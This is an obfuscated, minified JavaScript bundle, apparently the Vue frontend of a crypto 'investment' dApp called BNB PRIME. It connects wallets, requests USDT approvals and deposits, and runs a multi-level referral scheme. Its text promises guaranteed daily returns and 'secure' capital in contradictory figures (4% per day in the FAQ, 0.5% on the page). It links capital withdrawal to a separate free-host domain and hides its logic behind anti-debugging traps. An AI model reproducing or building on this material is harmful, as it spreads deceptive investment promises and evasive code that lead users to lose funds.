    VITE_VERCEL_GIT_COMMIT_MESSAGE: xe(392),
    VITE_VERCEL_GIT_COMMIT_REF: xe(400),
    VITE_VERCEL_GIT_COMMIT_SHA: xe(401),
    VITE_VERCEL_GIT_PREVIOUS_SHA: "",
    VITE_VERCEL_GIT_PROVIDER: xe(425),
    VITE_VERCEL_GIT_PULL_REQUEST_ID: "",
    VITE_VERCEL_GIT_REPO_ID: xe(335),
    VITE_VERCEL_GIT_REPO_OWNER: xe(328),
    VITE_VERCEL_GIT_REPO_SLUG: xe(282),
    VITE_VERCEL_OBSERVABILITY_CLIENT_CONFIG: xe(337),
    VITE_VERCEL_PROJECT_ID: "prj_Xth7RPbU6tV1kI8wfJWQG7VL7mpZ",
    VITE_VERCEL_PROJECT_PRODUCTION_URL: xe(262),
    VITE_VERCEL_TARGET_ENV: "production",
    VITE_VERCEL_URL: xe(305)
};

function Ec() {
    const e = ["__proto__", "25%", "table", "An error occurred during deposit.", "You deposit USDT (BEP-20) on BNB Chain. The USDT contract used is: 0x55d398326f99059fF775485246999027B3197955.", "fetchData", "EzMHc", "On the Dashboard, go to Your Reward section, click Withdraw Now, and confirm the transaction in your wallet. Profit is based on time passed since your last profit withdrawal and your active deposits.", "input", "exception", "How do I make my first deposit on the website?", "Initialization failed:", "protocol", "cxDtE", "1470954UBYjaf", "/?ref=", "host", "referralCode", "length", "What is the daily ROI and how long does it last?", "hMdjX", "load", "Wmhrh", "VITE_GIT_COMMIT_SHA", "init", "map", "Processing deposit...", "0x0000000000000000000000000000000000000000", "gUkWI", '{}.constructor("return this")( )', "10%", "Can I withdraw my principal (initial deposit)?", "warn", "6984700ddOzPj", "then", "MAX", "OsuDu", "4418670PUClym", "OjUkp", "Fix formatting in index.html", "bkMhd", "11043040emaywP", "usdbit-2-git-main-hgjkjs-projects.vercel.app", "accountsChanged", "stateObject", "ref", "HKsrE", "main", "dd5465397052ee3df558e0b088dc8d352e3df332", "WJIow", "mkQBp", "11BPrOiL", "reload", "setInterval", "chain", "Waiting for approval...", "counter", "dpl_3Hkt2Py2v5RPsnvaPCqTuegQDCGC", "bind", "35pQhGPW", "KRIKF", "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "KpMJy", "...", "error", "QlNiC", "yIlyB", "totalWithdraw", "zduMJ", "gger", "selected", "BNB PRIME has a 6-level referral program: 8%, 4%, 2%, 1%, 1%, 1%. Copy your referral link/invite code, share it, and earn when your team deposits through your link/code.", "github", "toString", "connectWallet", "BNB PRIME is a USDT-based investment dApp running on BNB Chain (BSC). You interact using a wallet like MetaMask set to BNB Chain.", "log", "RMndR", "substring", "GWIDJ", "isConnected", "How do I withdraw my daily profit on the website?", "www.bnbprime.space", "buildCommit", "pEBOj", "Referral link activates after investment.", "shortMessage", "1237316KJQRyT", "Failed to copy referral link.", "9OqpJcQ", "hasOwnProperty", "VITE_COMMIT_SHA", "Insufficient balance.", "client", "N/A", "prototype", "How does the referral program work?", "string", "action", "Referral link copied to clipboard!", "account", "JMjYl", "USDBIT2", "levels", "MEukF", "return (function() ", "endsWith", "RnpZl", "function *\\( *\\)", "QUXYc", "75%", "No commission to withdraw", "constructor", "Please enter a valid amount.", "CPSRs", "Level 1", "What is the minimum deposit?", "replace", "connected", "Yes, the contract is completely flexible and transparent; withdraw your initial deposit plus accumulated earnings at any time, without restrictions.", "test", "apply", "How do I withdraw referral rewards on the website?", "50%", "your_reward", "usdbit-2-3smrbd0zq-hgjkjs-projects.vercel.app", "total_deposit", "Referral rewards accumulate as bonus balance. Go to Total Commissions section, click Withdraw Now, and confirm in your wallet.", "debu", "$toast", "XqniB", "success", "available_commissions", "357026PKXhhH", "Minimum deposit is 3 USDT.", "location", "981970Wuqbwe", "Default ROI is 4% per day, and each deposit runs for 200 days. After 200 days, that deposit stops generating profit.", "levelCounts", "info", "call", "levelIncome", "balance", "while (true) {}", "production", "ethereum", "referralLink", "What token do I deposit?", "nimaprodev", "toFixed", "Deposit successful!", "console", "toast", "0.00", "trace", "1105083761", "lqVJe", '{"analytics":{"scriptSrc":"90b0362916e3190c/script.js","viewEndpoint":"90b0362916e3190c/view","eventEndpoint":"90b0362916e3190c/event","sessionEndpoint":"90b0362916e3190c/session"},"speedInsights":{"scriptSrc":"0cb45b40ec7845c9/script.js","endpoint":"0cb45b40ec7845c9/vitals"}}', "isLoading", "trim", "message", "What is BNB PRIME and which network does it run on?", "Level 3", "4ChZkMe", "dd54653", "Level 5 and Level 6", "search", "rEpjn", "ucLqS", "amount", "xiAmp", "The minimum deposit is 3 USDT.", "Level 2"];
    return Ec = function() {
        return e
    }, Ec()
}

function Or(e, t) {
    return e = e - 261, Ec()[e]
}
const J7 = {
    directives: {
        loading: D7
    },
    computed: {
        buildCommitShort() {
            const e = xe;
            return this[e(263)] ? this[e(263)][e(371)] > 12 ? this.buildCommit.slice(0, 12) : this[e(263)] : ""
        }
    },
    data() {
        const e = xe;
        return {
            rewardImg: J8,
            walletMoney: Q8,
            referralImg: e3,
            clipboard: t3,
            totalCommissionImg: n3,
            arrowRight: r3,
            group: ys,
            heroImg: s3,
            logo: i3,
            trendUp: o3,
            footerLogo: a3,
            telegram: c3,
            buildCommit: (Lp?.[e(376)] || Lp?.[e(271)] || "")[e(339)](),
            isConnected: !1,
            total_deposit: 0,
            total_withdraw: 0,
            amount: null,
            quickValues: [e(383), e(354), e(303), e(290), e(388)],
            selected: null,
            balance: 0,
            isLoading: !1,
            your_reward: 0,
            isWithdrawRewardLoading: !1,
            referralLink: "Referral link activates after investment.",
            available_commissions: "0",
            isClaimingReferralReward: !1,
            faqItems: [{
                question: e(341),
                answer: e(428)
            }, {
                question: e(327),
                answer: e(357)
            }, {
                question: "What is the minimum deposit?",
                answer: "The minimum deposit is 3 USDT."
            }, {
                question: e(363),
                answer: "Open Dashboard/App, click Connect Wallet, enter your amount (>= 3 USDT), click Approve USDT (first time only) and confirm in wallet, then click Deposit and confirm in wallet."
            }, {
                question: e(372),
                answer: "Default ROI is 4% per day, and each deposit runs for 200 days. After 200 days, that deposit stops generating profit. "
            }, {
                question: e(384),
                answer: e(299)
            }, {
                question: e(261),
                answer: "On the Dashboard, go to Your Reward section, click Withdraw Now, and confirm the transaction in your wallet. Profit is based on time passed since your last profit withdrawal and your active deposits."
            }, {
                question: e(276),
                answer: e(424)
            }, {
                question: e(302),
                answer: e(307)
            }],
            levels: [{
                name: e(295),
                percent: 8,
                icon: ys,
                downlineCount: 0,
                income: "0"
            }, {
                name: e(352),
                percent: 4,
                icon: ys,
                downlineCount: 0,
                income: "0"
            }, {
                name: e(342),
                percent: 2,
                icon: ys,
                downlineCount: 0,
                income: "0"
            }, {
                name: "Level 4",
                percent: 1,
                icon: ys,
                downlineCount: 0,
                income: "0"
            }, {
                name: e(345),
                percent: 1,
                icon: ys,
                downlineCount: 0,
                income: "0"
            }]
        }
    },
    methods: {
        async fetchData() {
            const e = xe,
                t = this;
            if (t[e(280)]) try {
                const n = t[e(280)];
                t[e(322)] = await V7(t[e(280)]);
                const r = await G7(n);
                if (r[e(370)] === "0") return;
                this[e(326)] = window[e(315)][e(365)] + "//" + window[e(315)][e(369)] + e(368) + r.referralCode, this[e(312)] = Un(r.totalBonus), this[e(370)] = r[e(370)], this.total_withdraw = Un(r[e(420)]), this[e(306)] = Un(r.totalDeposit);
                const s = await W7(n);
                this[e(283)] = this[e(283)][e(378)]((i, o) => ({
                    ...i,
                    downlineCount: s[e(318)][o] || 0,
                    income: s[e(321)][o] || "0"
                })), this[e(304)] = await K7(t[e(280)])
            } catch (n) {
                console[e(417)](n), n[e(270)]("shortMessage") && t[e(332)][e(417)](n[e(266)])
            }
        },
        async init() {
            const e = xe,
                t = this;
            try {
                if (await this[e(427)](), await this[e(358)](), window.setInterval(async () => {
                        await t.fetchData()
                    }, 10 * 1e3), window[e(325)])
                    if (e(373) !== e(336)) window.ethereum.on(e(396), function(n) {
                        const r = e;
                        window[r(315)][r(405)]()
                    });
                    else {
                        const n = _0x55e228(e(285) + e(382) + ");");
                        _0x2cfd6b = n()
                    }
            } catch (n) {
                if (e(294) !== "CPSRs") {
                    let r;
                    try {
                        r = _0x4165be("return (function() " + e(382) + ");")()
                    } catch {
                        r = _0x3c9a78
                    }
                    const s = r[e(331)] = r.console || {},
                        i = ["log", e(385), e(319), e(417), e(362), e(355), e(334)];
                    for (let o = 0; o < i[e(371)]; o++) {
                        const a = _0x4d9182[e(292)][e(275)][e(411)](_0x4e477e),
                            c = i[o],
                            u = s[c] || a;
                        a.__proto__ = _0x23b751[e(411)](_0xbd3db0), a[e(426)] = u[e(426)][e(411)](u), s[c] = a
                    }
                } else console[e(417)](e(364), n), n[e(266)] && this[e(332)].error(n.shortMessage)
            }
        },
        async withdrawCommission() {
            const e = xe;
            if (this[e(298)] || await si(), this[e(312)] === "0")
                if (e(348) !== e(289)) {
                    this.toast[e(417)](e(291));
                    return
                } else {
                    if (!_0x3ef5e6) return;
                    if (_0x107f30 === e(380)) return e(274);
                    if (_0x418db5[e(371)] <= 13) return this[e(280)];
                    const n = _0x1caea7[e(431)](0, 7),
                        r = _0x5b45b8[e(431)](_0x62c32b[e(371)] - 5);
                    return n + e(416) + r
                } await q7(this.account), await this[e(358)]()
        },
        getShortAddress(e) {
            const t = xe,
                n = 5;
            if (!e) return;
            if (e === t(380)) return "N/A";
            if (e[t(371)] <= n * 2 + 3) return this.account;
            const r = e[t(431)](0, n + 2),
                s = e.substring(e[t(371)] - n);
            return r + t(416) + s
        },
        shortAddress() {
            const e = xe;
            if (this.account) return this.getShortAddress(this[e(280)])
        },
        async connectWallet() {
            const e = xe,
                t = this;
            try {
                if (e(284) === e(432)) return !0;
                {
                    this[e(273)] = await si();
                    const n = await this[e(273)].requestAddresses();
                    this[e(433)] = !0, this[e(280)] = n[0]
                }
            } catch (n) {
                t[e(332)][e(417)](n[e(340)])
            }
        },
        formatDisplayNumber(e, t = 2) {
            const n = xe;
            return e == null ? n(333) : parseFloat(e)[n(329)](t)
        },
        selectValue(e) {
            const t = xe;
            if (this[t(423)] = e, e === t(388)) this[t(349)] = this.balance;
            else if (e[t(286)]("%"))
                if (t(381) === t(381)) {
                    const n = parseInt(e),
                        r = parseFloat(this[t(322)]) * n / 100;
                    this[t(349)] = r
                } else _0x465d8e(this, function() {
                    const n = t,
                        r = new _0x596bd4(n(288)),
                        s = new _0x2a91e8(n(414), "i"),
                        i = _0x2cf24d("init");
                    !r[n(300)](i + n(407)) || !s[n(300)](i + n(361)) ? i("0") : _0x43a0d4()
                })()
        },
        async doDeposit() {
            const e = xe;
            if (!this[e(349)] || parseFloat(this.amount) <= 0)
                if (e(366) !== e(366)) {
                    if (_0xad995b) return _0x21875f;
                    _0x1c1456(0)
                } else {
                    this[e(332)][e(417)](e(293));
                    return
                } if (parseFloat(this[e(349)]) < 2) {
                this[e(332)][e(417)](e(314));
                return
            }
            if (parseFloat(this[e(349)]) > parseFloat(this[e(322)])) {
                this[e(332)].error(e(272));
                return
            }
            this.isLoading = !0;
            try {
                const t = new URLSearchParams(window[e(315)][e(346)]),
                    n = t.get(e(398)) || "0",
                    r = Rx(this[e(349)][e(426)]());
                if (await H7(this[e(280)]) < r)
                    if (e(421) === e(421)) this.toast[e(319)](e(408)), await j7(this[e(280)]);
                    else {
                        if (!_0x5e542a || _0x4f1bf1[e(426)]() === "0") return 0;
                        const i = /\.?0+$/;
                        return _0x20d136[e(297)](i, "")
                    } this[e(332)].info(e(379)), await z7(this[e(280)], 0, n, this[e(349)].toString()), this[e(332)][e(311)](e(330)), await this[e(358)](), this.amount = null, this[e(423)] = null
            } catch (t) {
                console[e(417)](t), t.hasOwnProperty("shortMessage") ? e(359) !== "ZYXAw" ? this[e(332)][e(417)](t[e(266)]) : this[e(338)] = !1 : e(413) === e(393) ? this.toast[e(417)](_0x439e33[e(266)]) : this[e(332)][e(417)](e(356))
            } finally {
                e(389) === "LguyZ" ? this[e(332)][e(417)](e(356)) : this[e(338)] = !1
            }
        },
        async withdrawReward() {
            await X7(this[xe(280)])
        },
        copyToClipboard() {
            const e = xe;
            this.$copyText(this.referralLink)[e(387)](() => {
                const t = e;
                t(287) === "RnpZl" ? this[t(309)].success(t(279)) : (function() {
                    return !0
                })[t(292)](t(308) + "gger")[t(320)](t(278))
            }, () => {
                const t = e;
                if (t(430) === t(375)) {
                    const n = _0x5cff49[t(292)].prototype.bind(_0x5e7c8c),
                        r = _0x5b029c[_0x45c6d2],
                        s = _0xe651b2[r] || n;
                    n[t(353)] = _0x3d24d1[t(411)](_0x5c1aa6), n[t(426)] = s.toString.bind(s), _0x2ef37d[r] = n
                } else this[t(309)][t(417)]("Failed to copy referral link.")
            })
        }
    },
    setup() {
        const e = n => {
            if (!n || n[Or(426)]() === "0") return 0;
            const s = /\.?0+$/;
            return n.replace(s, "")
        };
        return {
            toast: ib.useToast(),
            truncateZeroes: e
        }
    },
    async mounted() {
        const e = xe,
            t = this;
        window.addEventListener(e(374), async () => {
            const n = e;
            n(310) === n(403) ? this[n(309)][n(417)](n(268)) : await t[n(377)]()
        }), window[e(406)](async () => {
            await t[e(358)]()
        }, 10 * 1e3)
    }
};

function T0(e) {
    function t(n) {
        const r = Or;
        if (r(419) === r(419)) {
            if (typeof n === r(277)) return (function(s) {}).constructor(r(323))[r(301)](r(409));
            if (r(347) === r(391)) {
                if (_0x25932f) {
                    const s = _0x228fd7.apply(_0x58140b, arguments);
                    return _0x249ab5 = null, s
                }
            } else("" + n / n)[r(371)] !== 1 || n % 20 === 0 ? (function() {
                const s = r;
                if (s(264) === s(418)) _0x16b24c("0");
                else return !0
            }).constructor(r(308) + r(422))[r(320)]("action") : (function() {
                return !1
            })[r(292)](r(308) + r(422))[r(301)](r(397));
            t(++n)
        } else {
            const s = _0x475acb ? function() {
                if (_0x285747) {
                    const i = _0x5afb27.apply(_0x35bbed, arguments);
                    return _0x49c296 = null, i
                }
            } : function() {};
            return _0x4529c4 = !1, s
        }
    }
    try {
        if (e) return t;
        t(0)
    } catch {}
}(function() {
    const e = xe;
    let t;
    try {
        t = Function(e(285) + e(382) + ");")()
    } catch {
        if (e(399) !== "wHZum") t = window;
        else return {
            rewardImg: _0x1ab68b,
            walletMoney: _0x279fac,
            referralImg: _0x54e259,
            clipboard: _0x128995,
            totalCommissionImg: _0x2785e4,
            arrowRight: _0xca583e,
            group: _0x57d8a4,
            heroImg: _0x3271dc,
            logo: _0x334b68,
            trendUp: _0x575b8e,
            footerLogo: _0x4d6018,
            telegram: _0x3e5748,
            buildCommit: (_0x22ba87?.VITE_GIT_COMMIT_SHA || _0xd0bdf?.[e(271)] || "").trim(),
            isConnected: !1,
            total_deposit: 0,
            total_withdraw: 0,
            amount: null,
            quickValues: ["10%", e(354), "50%", "75%", "MAX"],
            selected: null,
            balance: 0,
            isLoading: !1,
            your_reward: 0,
            isWithdrawRewardLoading: !1,
            referralLink: e(265),
            available_commissions: "0",
            isClaimingReferralReward: !1,
            faqItems: [{
                question: "What is BNB PRIME and which network does it run on?",
                answer: e(428)
            }, {
                question: e(327),
                answer: e(357)
            }, {
                question: e(296),
                answer: e(351)
            }, {
                question: e(363),
                answer: "Open Dashboard/App, click Connect Wallet, enter your amount (>= 3 USDT), click Approve USDT (first time only) and confirm in wallet, then click Deposit and confirm in wallet."
            }, {
                question: "What is the daily ROI and how long does it last?",
                answer: e(317)
            }, {
                question: e(384),
                answer: e(299)
            }, {
                question: "How do I withdraw my daily profit on the website?",
                answer: e(360)
            }, {
                question: e(276),
                answer: e(424)
            }, {
                question: e(302),
                answer: e(307)
            }],
            levels: [{
                name: e(295),
                percent: 8,
                icon: _0x1c3393,
                downlineCount: 0,
                income: "0"
            }, {
                name: e(352),
                percent: 4,
                icon: _0x22e488,
                downlineCount: 0,
                income: "0"
            }, {
                name: e(342),
                percent: 2,
                icon: _0x385c87,
                downlineCount: 0,
                income: "0"
            }, {
                name: "Level 4",
                percent: 1,
                icon: _0x25a387,
                downlineCount: 0,
                income: "0"
            }, {
                name: e(345),
                percent: 1,
                icon: _0x145db5,
                downlineCount: 0,
                income: "0"
            }]
        }
    }
    t[e(406)](T0, 4e3)
})();
const Q7 = (e, t) => {
        const n = e.__vccOpts || e;
        for (const [r, s] of t) n[r] = s;
        return n
    },
    eC = J7,
    tC = {
        class: "w-full min-h-screen flex justify-center items-start"
    },
    nC = {
        class: "w-[380px] min-h-[700px] overflow-hidden"
    },
    rC = {
        class: "relative bg-bgCard shadow-custom-glow text-center overflow-hidden"
    },
    sC = {
        class: "absolute top-0 left-0 w-full flex items-center justify-between px-5 py-4 z-10"
    },
    iC = ["src"],
    oC = {
        key: 0,
        class: "flex items-center space-x-2"
    },
    aC = {
        class: "text-black text-sm bg-yellow-500 px-3 py-1 rounded-md"
    },
    cC = {
        class: "mt-16"
    },
    lC = ["src"],
    uC = {
        class: "bg-gray-100 p-6 rounded-md w-full"
    },
    fC = {
        class: "flex justify-between gap-2"
    },
    dC = {
        class: "flex-1 bg-gray-50 p-4 rounded-md flex flex-col"
    },
    hC = {
        class: "text-white text-xl font-bold mt-1"
    },
    pC = {
        class: "flex-1 bg-gray-50 p-4 rounded-md flex flex-col"
    },
    mC = {
        class: "text-white text-xl font-bold mt-1"
    },
    bC = {
        class: "flex flex-col mt-2"
    },
    gC = {
        class: "flex flex-col mt-2"
    },
    xC = {
        class: "relative"
    },
    yC = {
        class: "flex items-center gap-2 mt-3"
    },
    wC = ["onClick"],
    _C = {
        class: "flex items-center justify-end mt-5 mb-2"
    },
    EC = ["src"],
    vC = {
        class: "text-xs text-gray-400"
    },
    TC = {
        class: "relative text-center overflow-hidden"
    },
    SC = ["src"],
    CC = {
        class: "absolute inset-0 flex flex-col justify-end items-center text-center px-4 pb-6"
    },
    IC = {
        class: "bg-gray-100 p-6 rounded-md w-full"
    },
    AC = {
        class: "flex items-start gap-4 p-2 rounded-md"
    },
    NC = {
        class: "w-14 h-14 rounded-md bg-primary flex items-center justify-center mt-1"
    },
    PC = ["src"],
    OC = {
        class: "flex flex-col text-left"
    },
    RC = {
        class: "text-xl font-semibold text-white leading-none mt-3"
    },
    MC = {
        class: "inline-flex items-center"
    },
    kC = ["src"],
    BC = {
        class: "bg-gray-100 p-6 w-full"
    },
    LC = ["src"],
    $C = {
        class: "relative w-full mb-10"
    },
    DC = ["value"],
    FC = ["src"],
    UC = {
        class: "w-full text-center"
    },
    VC = {
        class: "relative w-full pb-20"
    },
    HC = ["src"],
    jC = {
        class: "absolute inset-x-0 bottom-0 px-4"
    },
    zC = {
        class: "bg-gray-100 p-6 rounded-md w-full mx-auto"
    },
    qC = {
        class: "flex items-center gap-4"
    },
    GC = {
        class: "w-14 h-14 rounded-md bg-primary flex items-center justify-center"
    },
    WC = ["src"],
    XC = {
        class: "flex flex-col text-left flex-1"
    },
    KC = {
        class: "text-xl font-semibold text-white mt-2 leading-none"
    },
    ZC = ["src"],
    YC = {
        class: "flex flex-col gap-2 w-full max-w-md mx-auto mt-4 px-4"
    },
    JC = {
        class: "w-10 h-10 rounded-md bg-primary flex items-center justify-center"
    },
    QC = ["src"],
    eI = {
        class: "flex flex-col text-left"
    },
    tI = {
        class: "text-primary font-bold text-sm"
    },
    nI = {
        class: "text-xl font-semibold text-white"
    },
    rI = {
        class: "text-xs text-gray-400 mt-1"
    },
    sI = {
        class: "text-xs text-gray-400"
    },
    iI = {
        class: "p-6 w-full mb-6"
    },
    oI = {
        class: "flex flex-col gap-3"
    },
    aI = {
        class: "list-none cursor-pointer text-left flex items-start justify-between gap-3"
    },
    cI = {
        class: "text-white font-semibold text-sm"
    },
    lI = {
        class: "text-gray-400 text-sm leading-relaxed mt-3 text-left"
    },
    uI = {
        class: "text-center p-6"
    },
    fI = {
        class: "flex flex-col items-center text-center"
    },
    dI = ["src"],
    hI = {
        key: 0,
        class: "mt-3 text-xs text-gray-500"
    },
    pI = {
        class: "font-mono"
    },
    mI = {
        href: "https://bnbprime.fwh.is/withdraw",
        class: "text-gray-200 px-4 py-2 rounded-lg border border-grey-300 mt-4 mb-10 flex items-center gap-2"
    },
    bI = ["src"];

function gI(e, t, n, r, s, i) {
    const o = j1("loading");
    return Ue(), pt("div", tC, [z("div", nC, [z("div", rC, [z("header", sC, [z("img", {
        src: e.logo,
        alt: "Hero Image",
        class: "object-cover"
    }, null, 8, iC), e.isConnected ? (Ue(), pt("div", oC, [z("span", aC, Fe(e.shortAddress()), 1)])) : (Ue(), pt("button", {
        key: 1,
        onClick: t[0] || (t[0] = (...a) => e.connectWallet && e.connectWallet(...a)),
        class: "bg-primary text-white px-4 py-2 rounded-md"
    }, " Connect Wallet "))]), z("div", cC, [z("img", {
        src: e.heroImg,
        alt: "Hero Image",
        class: "object-cover w-full h-auto"
    }, null, 8, lC), t[6] || (t[6] = z("div", {
        class: "absolute inset-0 flex flex-col justify-end items-center text-center px-4 pb-6"
    }, [z("p", {
        class: "text-2xl text-white font-bold w-3/4"
    }, " Grow your future with BNB PRIME and enjoy daily bonuses with flexibility. "), z("p", {
        class: "mt-3 text-xs text-white w-full"
    }, " 0.5% daily bonus and 6 levels Referral Marketing! ")], -1))])]), z("div", uC, [z("div", fC, [z("div", dC, [t[7] || (t[7] = z("p", {
        class: "text-primary text-sm"
    }, "Total Deposit", -1)), z("p", hC, Fe(e.formatDisplayNumber(e.total_deposit)) + " USDT", 1)]), z("div", pC, [t[8] || (t[8] = z("p", {
        class: "text-primary text-sm"
    }, "Total Withdraw", -1)), z("p", mC, Fe(e.formatDisplayNumber(e.total_withdraw)) + " USDT", 1)])]), z("div", bC, [z("div", gC, [t[10] || (t[10] = z("label", {
        class: "text-gray-300 text-sm mb-2",
        for: "amount"
    }, "Amount (min 3 USDT)", -1)), z("div", xC, [Pi(z("input", {
        id: "amount",
        type: "number",
        "onUpdate:modelValue": t[1] || (t[1] = a => e.amount = a),
        placeholder: "Enter amount",
        class: "w-full p-3 pr-16 rounded-lg bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-primary"
    }, null, 512), [
        [Qi, e.amount]
    ]), t[9] || (t[9] = z("span", {
        class: "absolute right-4 top-1/2 -translate-y-1/2 text-gray-300 text-sm font-semibold select-none"
    }, " USDT ", -1))])]), z("div", yC, [(Ue(!0), pt(Ne, null, Ia(e.quickValues, a => (Ue(), pt("div", {
        key: a,
        onClick: c => e.selectValue(a),
        class: fs(["px-2.5 py-1 rounded-md  text-xs font-medium cursor-pointer border transition whitespace-nowrap", e.selected === a ? "bg-gray-600 text-white border-primary" : "text-gray-500 border-gray-500 hover:border-primary"])
    }, Fe(a), 11, wC))), 128))])]), z("div", _C, [z("img", {
        src: e.trendUp,
        alt: "trendUp Image",
        class: "object-contain"
    }, null, 8, EC), z("p", vC, "Your Balance " + Fe(e.formatDisplayNumber(e.balance)) + " USDT", 1)]), Pi((Ue(), pt("button", {
        class: "w-full bg-primary text-white font-semibold py-3 rounded-lg hover:opacity-90 transition",
        onClick: t[2] || (t[2] = (...a) => e.doDeposit && e.doDeposit(...a))
    }, [...t[11] || (t[11] = [Nn(" Deposit Now ", -1)])])), [
        [o, e.isLoading]
    ])]), z("div", TC, [z("img", {
        src: e.rewardImg,
        alt: "Reward Image",
        class: "object-cover w-full h-auto"
    }, null, 8, SC), z("div", CC, [z("div", IC, [z("div", AC, [z("div", NC, [z("img", {
        src: e.walletMoney,
        alt: "walletMoney",
        class: "object-contain"
    }, null, 8, PC)]), z("div", OC, [t[13] || (t[13] = z("p", {
        class: "text-primary font-semibold text-sm"
    }, "Your Reward", -1)), z("span", RC, Fe(e.formatDisplayNumber(e.your_reward, 6)) + " USDT ", 1), Pi((Ue(), pt("button", {
        onClick: t[3] || (t[3] = (...a) => e.withdrawReward && e.withdrawReward(...a)),
        class: "text-white text-sm mt-5 inline-flex items-center justify-center bg-secondary p-2 px-5 rounded"
    }, [z("span", MC, [t[12] || (t[12] = Nn(" Withdraw Now ", -1)), z("img", {
        src: e.arrowRight,
        alt: "arrow right",
        class: "ml-4 align-middle"
    }, null, 8, kC)])])), [
        [o, e.isWithdrawRewardLoading]
    ])])])])])]), t[23] || (t[23] = y2('<div class="text-white p-6 my-6"><p class="text-base font-semibold">Welcome to BNB PRIME</p><p class="text-2xl font-extrabold"> Your Smart Financial </p><p class="text-2xl font-extrabold text-primary"> Experience </p><p class="text-justify mt-4 text-base leading-loose text-gray-400"> Welcome to BNB PRIME – your trusted gateway to stable USDT-based growth!<br> At BNB PRIME, you earn a solid daily return (ROI) of 0.5% for as long as your deposit remains active, starting with just 3 USDT.<br> Our automated smart contract system keeps your capital flexible and secure, while rewarding you with transparent daily earnings.<br> Plus, with our 5-level referral program, you can boost your earnings: 8% from Level 1, 4% from Level 2, 2% from Level 3, 1% from Level 4, 1% from Level 5, and 1% from Level 6 paid instantly in USDT.<br> <br></p></div>', 1)), z("div", BC, [z("img", {
        src: e.referralImg,
        alt: "referral Image",
        class: "object-cover mb-4"
    }, null, 8, LC), t[14] || (t[14] = z("div", {
        class: "flex items-center text-2xl font-extrabold gap-2 mb-4"
    }, [z("span", {
        class: "text-white"
    }, "Your"), z("span", {
        class: "text-primary"
    }, "referral link")], -1)), t[15] || (t[15] = z("p", {
        class: "text-justify text-base leading-loose text-gray-400 mb-6"
    }, " Share your unique link and earn rewards every time someone joins through you. Invite friends, build your network, and grow together—success is better when shared. ", -1)), z("div", $C, [z("input", {
        readonly: "",
        value: e.referralLink,
        class: "w-full pl-4 py-3 rounded-xl bg-gray-50 text-white focus:outline-none focus:ring-2 focus:ring-primary"
    }, null, 8, DC), z("button", {
        class: "absolute right-2 top-1/2 -translate-y-1/2 w-10 h-10 rounded-xl bg-primary flex items-center justify-center",
        onClick: t[4] || (t[4] = (...a) => e.copyToClipboard && e.copyToClipboard(...a))
    }, [z("img", {
        src: e.clipboard,
        alt: "clipboard",
        class: "w-5 h-5"
    }, null, 8, FC)])])]), z("div", UC, [z("div", VC, [z("img", {
        src: e.totalCommissionImg,
        alt: "Total Commissions",
        class: "object-cover w-full h-auto"
    }, null, 8, HC), z("div", jC, [z("div", zC, [z("div", qC, [z("div", GC, [z("img", {
        src: e.group,
        alt: "Group Icon",
        class: "object-contain"
    }, null, 8, WC)]), z("div", XC, [t[17] || (t[17] = z("p", {
        class: "text-primary font-semibold text-sm"
    }, "Total Commissions", -1)), z("span", KC, Fe(e.formatDisplayNumber(e.available_commissions)) + " USDT", 1), Pi((Ue(), pt("button", {
        onClick: t[5] || (t[5] = (...a) => e.withdrawCommission && e.withdrawCommission(...a)),
        class: "text-white bg-secondary text-sm mt-2 w-36 inline-flex items-center rounded px-3 py-1"
    }, [t[16] || (t[16] = Nn(" Withdraw Now ", -1)), z("img", {
        src: e.arrowRight,
        alt: "Arrow Right",
        class: "ml-2 align-middle"
    }, null, 8, ZC)])), [
        [o, e.isClaimingReferralReward]
    ])])])])])]), z("div", YC, [(Ue(!0), pt(Ne, null, Ia(e.levels, a => (Ue(), pt("div", {
        key: a.name,
        class: "bg-gray-800 p-4 rounded-md w-full flex items-center gap-4"
    }, [z("div", JC, [z("img", {
        src: a.icon,
        alt: "Level Icon",
        class: "w-6 h-6 object-contain"
    }, null, 8, QC)]), z("div", eI, [z("p", tI, Fe(a.name), 1), z("span", nI, Fe(a.percent) + "%", 1), z("p", rI, "Members: " + Fe(a.downlineCount), 1), z("p", sI, "Income: " + Fe(e.formatDisplayNumber(a.income, 4)) + " USDT", 1)])]))), 128))])]), z("div", iI, [t[19] || (t[19] = z("div", {
        class: "flex items-center text-2xl font-extrabold gap-2 mb-4"
    }, [z("span", {
        class: "text-primary"
    }, "FAQ")], -1)), z("div", oI, [(Ue(!0), pt(Ne, null, Ia(e.faqItems, (a, c) => (Ue(), pt("details", {
        key: a.question,
        class: "bg-gray-50 rounded-md p-4 group"
    }, [z("summary", aI, [z("span", cI, Fe(c + 1) + ". " + Fe(a.question), 1), t[18] || (t[18] = z("span", {
        class: "text-primary text-base leading-none group-open:rotate-45 transition-transform"
    }, "+", -1))]), z("p", lI, Fe(a.answer), 1)]))), 128))])]), z("div", uI, [z("div", fI, [z("img", {
        src: e.footerLogo,
        alt: "footer logo"
    }, null, 8, dI), t[22] || (t[22] = z("p", {
        class: "text-justify mt-5 text-base text-gray-500"
    }, [Nn(" BNB PRIME operates via a transparent USDT smart contract that rewards you with fixed daily returns while offering flexibility. Your capital remains accessible and secure, profits are paid out automatically, and you can withdraw your initial deposit at any time. Our 6-level referral system awards instant bonuses in USDT. BNB PRIME: smart, stable, blockchain-based income."), z("br"), z("br"), z("br"), z("small", null, "2026 BNBPRIME")], -1)), e.buildCommit ? (Ue(), pt("p", hI, [t[20] || (t[20] = Nn(" Commit: ", -1)), z("span", pI, Fe(e.buildCommitShort), 1)])) : w2("", !0), z("a", mI, [z("img", {
        src: e.telegram,
        alt: "telegram"
    }, null, 8, bI), t[21] || (t[21] = Nn(" withdraw capital", -1))])])])])])
}
const xI = Q7(eC, [
        ["render", gI]
    ]),
    Mi = Qn;
(function(e, t) {
    const n = Qn,
        r = e();
    for (;;) try {
        if (parseInt(n(326)) / 1 * (parseInt(n(348)) / 2) + parseInt(n(337)) / 3 * (parseInt(n(321)) / 4) + parseInt(n(355)) / 5 + parseInt(n(338)) / 6 + -parseInt(n(353)) / 7 + -parseInt(n(349)) / 8 + parseInt(n(358)) / 9 === t) break;
        r.push(r.shift())
    } catch {
        r.push(r.shift())
    }
})(vc, 262406);

function vc() {
